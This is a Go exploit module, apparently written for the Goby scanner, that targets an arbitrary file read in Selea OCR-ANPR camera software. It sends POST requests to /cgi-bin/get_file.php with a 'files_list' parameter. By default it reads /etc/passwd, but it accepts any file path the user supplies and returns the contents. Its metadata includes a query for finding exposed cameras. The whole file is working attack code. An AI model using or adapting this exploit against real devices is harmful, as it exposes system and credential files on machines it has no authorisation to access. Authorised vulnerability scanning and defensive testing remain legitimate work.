package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "Selea OCR-ANPR get_file.php File read",
  "Description": "Selea OCR-ANPR get_file.php File read",
  "Product": "Selea OCR-ANPR",
  "Homepage": "https://www.selea.com/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "title=\"Selea ANPR Camera\"",
  "Level": "1",
  "Impact": "File read",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "File",
      "type": "input",
      "value": "/etc/passwd"
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["File read"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["Selea OCR-ANPR"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri := "/cgi-bin/get_file.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = "name=pq&files_list=/etc/passwd"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
        		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "etc/passwd")
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			file := ss.Params["File"].(string)
		    uri := "/cgi-bin/get_file.php"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
			cfg.Data = fmt.Sprintf("name=pq&files_list=%s", file)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
            		expResult.Output = resp.Utf8Html
            		expResult.Success = true
        	}
			return expResult
		},
	))
}